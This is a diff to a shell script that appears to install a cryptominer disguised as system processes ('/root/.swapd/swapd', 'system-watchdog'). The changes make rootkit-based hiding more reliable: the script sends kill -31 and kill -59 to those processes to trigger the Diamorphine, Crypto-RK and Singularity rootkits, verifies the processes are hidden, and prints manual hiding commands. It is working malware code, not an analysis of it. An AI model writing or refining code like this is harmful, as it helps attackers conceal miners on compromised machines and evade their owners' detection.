@@ -149,33 +149,14 @@ IFS=$'\n\t'
 # Works without pgrep and without ps -aux (BusyBox ps has neither)
 proc_pids() {
     local pattern="$1"
-    if command -v pgrep >/dev/null 2>&1; then
-        # pgrep matches both real processes and kernel threads like [kswapd0]
-        # We need to filter out kernel threads (processes with cmdline starting with [)
-        pgrep -f "$pattern" 2>/dev/null | while read -r pid; do
-            # Check if it's a kernel thread by looking at cmdline
-            cmdline=$(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null || echo "")
-            # Kernel threads have empty cmdline or show as [name] in ps
-            # Skip if cmdline is empty OR if comm (process name) is in brackets
-            comm=$(cat /proc/$pid/comm 2>/dev/null || echo "")
-            if [ -n "$cmdline" ] && ! echo "$comm" | grep -q '^\[.*\]$'; then
-                echo "$pid"
-            fi
-        done
-    else
-        # Fallback for systems without pgrep
-        for _d in /proc/[0-9]*; do
-            _p="${_d##*/}"
-            _c=$(tr "\0" " " < "$_d/cmdline" 2>/dev/null) || continue
-            # Skip if cmdline is empty (kernel thread)
-            [ -z "$_c" ] && continue
-            # Skip if comm is in brackets (kernel thread)
-            _comm=$(cat "$_d/comm" 2>/dev/null || echo "")
-            echo "$_comm" | grep -q '^\[.*\]$' && continue
-            # Match pattern
-            case "$_c" in *"$pattern"*) echo "$_p" ;; esac
-        done
-    fi
+    # Use ps to get PIDs, filtering out kernel threads
+    # Kernel threads show as [name] and have no cmdline
+    ps ax -o pid,comm,args 2>/dev/null | \
+        grep -v "^\s*PID" | \
+        grep "$pattern" | \
+        grep -v grep | \
+        grep -v "^\s*[0-9]\+\s\+\[" | \
+        awk '{print $1}'
 }
 send_sig() {
     local sig="$1"; shift
@@ -2861,9 +2842,11 @@ while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$all_hidden" = false ]; do
     # Send both hide signals to all target processes
     # kill -31: Diamorphine + Crypto-RK
     # kill -59: Singularity
-    for pattern in config.json swapd swapfile system-watchdog; do
+    # Use specific patterns to avoid matching kernel threads like [kswapd0]
+    for pattern in "/root/.swapd/swapd" "/root/.swapd/swapfile" "system-watchdog"; do
         pids=$(proc_pids "$pattern" 2>/dev/null)
         if [ -n "$pids" ]; then
+            echo "[*] Found PIDs for '$pattern': $pids"
             for pid in $pids; do
                 kill -31 "$pid" 2>/dev/null || true
                 kill -59 "$pid" 2>/dev/null || true
@@ -2876,12 +2859,20 @@ while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$all_hidden" = false ]; do
     
     # Check if processes are now hidden
     echo "[*] Verifying process visibility..."
-    if ! proc_pids swapd | grep -q . 2>/dev/null && \
-       ! proc_pids system-watchdog | grep -q . 2>/dev/null; then
+    swapd_visible=$(proc_pids "/root/.swapd/swapd" 2>/dev/null)
+    watchdog_visible=$(proc_pids "system-watchdog" 2>/dev/null)
+    
+    if [ -z "$swapd_visible" ] && [ -z "$watchdog_visible" ]; then
         all_hidden=true
         echo "[✓] All processes successfully hidden!"
     else
-        echo "[*] Some processes still visible, retrying..."
+        if [ -n "$swapd_visible" ]; then
+            echo "[*] swapd still visible (PIDs: $swapd_visible)"
+        fi
+        if [ -n "$watchdog_visible" ]; then
+            echo "[*] system-watchdog still visible (PIDs: $watchdog_visible)"
+        fi
+        echo "[*] Retrying..."
         sleep 3
     fi
 done
@@ -2889,10 +2880,14 @@ done
 if [ "$all_hidden" = false ]; then
     echo "[!] WARNING: Processes may still be visible after $MAX_ATTEMPTS attempts"
     echo "[*] Manual fix: Run these commands:"
-    echo "    kill -31 \$(pgrep swapd)"
-    echo "    kill -59 \$(pgrep swapd)"
-    echo "    kill -31 \$(pgrep system-watchdog)"
-    echo "    kill -59 \$(pgrep system-watchdog)"
+    echo "    kill -31 \$(pgrep -f '/root/.swapd/swapd')"
+    echo "    kill -59 \$(pgrep -f '/root/.swapd/swapd')"
+    echo "    kill -31 \$(pgrep -f 'system-watchdog')"
+    echo "    kill -59 \$(pgrep -f 'system-watchdog')"
+    echo ""
+    echo "Or use ps to find exact PIDs:"
+    echo "    ps ax | grep swapd"
+    echo "    kill -59 <PID>"
 fi
 
 echo '========================================================================'
